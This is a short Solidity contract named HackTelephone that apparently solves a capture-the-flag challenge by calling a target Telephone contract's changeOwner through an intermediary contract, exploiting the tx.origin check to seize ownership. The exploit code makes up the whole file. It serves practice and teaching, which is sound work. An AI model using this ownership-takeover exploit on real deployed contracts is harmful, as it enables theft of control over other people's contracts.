pragma solidity ^0.5.0;

import "./Telephone.sol";

contract HackTelephone {
    address public telephoneAddr;
    
    constructor(address addr) public {
        telephoneAddr = addr;
    }
    
    function hack(address player) public {
        Telephone(telephoneAddr).changeOwner(player);
    }
}